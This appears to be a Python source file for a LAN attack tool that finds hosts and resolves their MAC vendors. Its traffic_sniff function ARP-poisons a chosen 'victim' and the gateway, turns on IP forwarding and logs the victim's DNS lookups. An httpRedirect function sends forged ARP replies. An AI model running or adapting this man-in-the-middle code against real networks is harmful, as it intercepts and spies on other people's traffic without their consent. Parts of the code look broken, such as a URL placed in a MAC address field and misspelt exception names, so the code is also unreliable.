### Kryptic Studio ###

# Local Libraries

# Libraries
try:
    from scapy.all import *
except:
    print("\nERROR: Requirements have not been satisfied properly. Please look at the README file for configuration instructions.")
# Standard Libraries
try:
    import os
    import signal
    import sys
    import threading
    import time
    import subprocess
    import socket
    from urllib.request import urlopen, Request
    from kamene.config import conf  
    conf.ipv6_enabled = False
    from kamene.all import *
    import scan, spoof, nmap
    from urllib.error import URLError
except:
    print("\nERROR: Requirements have not been satisfied properly. Please look at the README file for configuration instructions.")

# Function Deffinitions

## GLOBAL VARS
self_ip = str(subprocess.check_output("ipconfig getifaddr en0", shell=True))[2:-3]
lan = self_ip.split(".")
lan = lan[0] + "." + lan[1] + "." + lan[2]
nmap_broadcast = lan + ".1/24"
gateway_ip = str(subprocess.check_output("route get default | grep gateway | cut -f 2 -d \":\"", shell=True))[3:-3]
gateway_mac = ""
hosts = dict()

localtime = time.asctime(time.localtime(time.time()) )

## Checks for internet connection
def checkInternetConnection():
    try:
        urlopen('https://github.com', timeout=3)
        return True
    except URLError as err:
        return False
    except KeyboardInterrupt:
        return

def get_online_hosts_with_mac():
    os.system('clear')
    print("Searching for clients with mac addresses in the LAN...")
    nmap_broadcast = lan + ".1/24"
    subprocess.check_output("nmap -sP " + nmap_broadcast, shell=True)
    arp_result = subprocess.check_output("arp -a", shell=True)
    if arp_result == "":
        print("No online clients were found.")
        return
    arp_result = arp_result.decode().split('\n')
    del arp_result[-1]
    for host in arp_result:
        host = host.split(" ")
        if host[3] == "(incomplete)":
            continue
        global hosts
        hosts[host[1][1:-1]] = host[3]
        global gateway_ip
        global gateway_mac
        if host[1][1:-1] == gateway_ip:
            gateway_mac = host[3]
    print("%-15s %-30s %-15s %s"%("Gateway", "Vendor", "IP", "MAC"))

def resolveMac(mac):
    try:
        # send request to macvendors.co
        url = "http://macvendors.co/api/vendorname/"
        request = Request(url + mac, headers={'User-Agent': "API Browser"})
        response = urlopen(request)
        vendor = response.read()
        vendor = vendor.decode("utf-8")
        vendor = vendor[:25]

        if vendor == "No vendor":
            vendor = "N/A"
        return vendor
    except:
        return "N/A"

def get_clients_OnLan():
    try:
        if checkInternetConnection():
            pass
        else:
            os.system('clear')
            print("\n{}ERROR: It seems that you are offline. Please check your internet connection.{}\n".format(RED, END))
            return
    except KeyboardInterrupt:
        shutdown()
    get_online_hosts_with_mac()
    for key, value in hosts.items():
        if key == gateway_ip and value == gateway_mac:
            print("%-15s %-30s %-15s %s"%("Yes", resolveMac(value), key, value))
            continue
        if key == self_ip:
            print("%-15s %-30s %-15s %s (Your Machine)"%("", resolveMac(value), key, value))
            continue
        try:
            print("%-15s %-30s %-15s %s %s"%("", resolveMac(value), key, value, socket.gethostbyaddr(key)))
        except Exception as e:
            print("%-15s %-30s %-15s %s"%("", resolveMac(value), key, value))

def traffic_sniff():
    global localtime

    localtime = localtime[11:16]


    if localtime[:1] == "1":
        localtime += " PM"
    else:
        localtime += " AM"


    try:
        if checkInternetConnection():
            pass
        else:
            os.system('clear')
            print("\n{}ERROR: It seems that you are offline. Please check your internet connection.{}\n".format(RED, END))
            return
    except KeyboardInterrupt:
        return

    get_clients_OnLan()
    clientIP = input("Client's IP: ")
    global self_ip
    if clientIP == self_ip:
        print("You can not sniff your self. ")
        return
    global gateway_ip
    gatewayIP = gateway_ip
    interface = input('Interface: ')

    print("\n* Enabling IP Forwarding...")

    os.system('sudo sysctl -w net.inet.ip.forwarding=1') #Ensure the victim recieves packets by forwarding them

    print('\t\t\nAttacking Client & Gateway... ')

    def dnshandle(pkt):
    	if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0: #Strip what information you need from the packet capture
        	print('{}>>> Client: {} has searched for:  {}'.format(localtime, clientIP, str(pkt.getlayer(DNS).qd.qname)[2:-2]))

    def v_poison():
        v = ARP(pdst=clientIP, psrc=gatewayIP)
        while True:
            try:
                send(v,verbose=0,inter=1,loop=1)
            except KeyboardInterupt: # Functions constructing and sending the ARP packets
                return

    def gw_poison():
        gw = ARP(pdst=gatewayIP, psrc=clientIP)
        while True:
            try:
                send(gw,verbose=0,inter=1,loop=1)
            except KeyboardInterupt:
                return

    vthread = []
    gwthread = []

    
    while True: # Threads 
        vpoison = threading.Thread(target=v_poison)
        vpoison.setDaemon(True)
        vthread.append(vpoison)
        vpoison.start()    
        gwpoison = threading.Thread(target=gw_poison)
        gwpoison.setDaemon(True)
        gwthread.append(gwpoison)
        gwpoison.start()
        
        pkt = sniff(iface=interface,filter='udp port 53',prn=dnshandle)

def httpRedirect():
    get_clients_OnLan()
    clientIP = input("Client's IP: ")
    clientMAC = input("Client's MAC: ")
    global gateway_ip
    gatewayIP = gateway_ip
    gatewayMAC = input("Gateway MAC: ")
    interface = input('Interface: ')

    os.system('sudo sysctl -w net.inet.ip.forwarding=1') #Ensure the victim recieves packets by forwarding them

    send(ARP(op = 2, pdst = clientIP, psrc = gatewayIP, hwdst= "www.Kryptic-studio.com"))
    send(ARP(op = 2, pdst = gatewayIP, psrc = clientIP, hwdst="www.Kryptic-studio.com"))